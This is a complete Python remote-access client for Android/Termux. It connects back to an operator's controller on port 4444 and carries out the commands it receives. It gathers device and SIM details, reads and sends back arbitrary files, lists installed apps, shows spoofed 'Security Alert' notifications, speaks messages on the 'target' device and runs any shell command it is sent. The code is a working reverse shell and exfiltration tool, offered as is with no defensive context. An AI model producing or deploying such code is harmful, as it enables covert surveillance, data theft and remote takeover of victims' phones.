import socket
import subprocess

def run_client():
    print("""
    =========================================
       HCO ADVANCED CLIENT (v6.0 ACTIVE)   
    =========================================
    """)
    server_ip = input("[?] Enter Server IP (e.g., 192.168.1.10): ").strip()
    port = 4444
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, port))
        print("[+] Connection Established with Controller Node!")
    except Exception as e:
        print(f"[-] Connection Failed: {e}")
        return
    
    while True:
        try:
            data = client.recv(4096).decode()
            if not data or data == 'exit':
                break
            
            # 1. Real Device Properties & Intel
            if data == 'sysinfo':
                cmd = """
                echo ' Brand         : ' $(getprop ro.product.brand)
                echo ' Model         : ' $(getprop ro.product.model)
                echo ' Device Code   : ' $(getprop ro.product.device)
                echo ' Android Ver   : ' $(getprop ro.build.version.release)
                echo ' Architecture  : ' $(uname -m)
                echo ' Total RAM     : ' $(free -h | awk '/Mem:/ {print $2}')
                echo ' Free RAM      : ' $(free -h | awk '/Mem:/ {print $4}')
                echo ' Network Type  : ' $(getprop gsm.network.type 2>/dev/null || echo 'Wi-Fi / Mobile Data')
                echo ' SIM Operator  : ' $(getprop gsm.operator.alpha 2>/dev/null || echo 'Not Available')
                echo ' IP Address    : ' $(ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' || hostname -I)
                """
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 2. Voice Alert
            elif data.startswith('alert:'):
                msg = data.split('alert:')[1]
                subprocess.Popen(f"termux-tts-speak '{msg}'", shell=True)
                output = b"Voice alert executed successfully on target speaker!"
                
            # 3. File Downloader
            elif data.startswith('download:'):
                file_path = data.split('download:')[1]
                try:
                    with open(file_path, 'rb') as f:
                        output = f.read()
                except Exception as file_err:
                    output = f"File Read Error: {str(file_err)}".encode()
                    
            # 4. Popup Screen Note
            elif data.startswith('popup:'):
                note_content = data.split('popup:')[1]
                notif_cmd = f"termux-notification --title 'HCO Security Alert' --content '{note_content}'"
                subprocess.Popen(notif_cmd, shell=True)
                output = b"Popup notification pushed successfully to target screen!"
                
            # 5. List Installed Apps (Check Apps)
            elif data == 'apps':
                app_cmd = "pm list packages -f 2>/dev/null"
                output = subprocess.check_output(app_cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 6. Battery & Storage
            elif data == 'battery':
                batt_cmd = "termux-battery-status 2>/dev/null || echo 'Battery status unavailable'; echo ''; df -h"
                output = subprocess.check_output(batt_cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 7. Device Logs / Network Status
            elif data == 'logs':
                log_cmd = "netstat -an 2>/dev/null || ss -an; echo ''; uptime"
                output = subprocess.check_output(log_cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 8. Custom Shell Command
            elif data.startswith('cmd:'):
                real_cmd = data.split('cmd:')[1]
                output = subprocess.check_output(real_cmd, shell=True, stderr=subprocess.STDOUT)
            else:
                output = b"Unknown payload instruction."
                
        except Exception as e:
            output = str(e).encode()
            
        client.send(output)
        
    client.close()

if __name__ == "__main__":
    run_client()
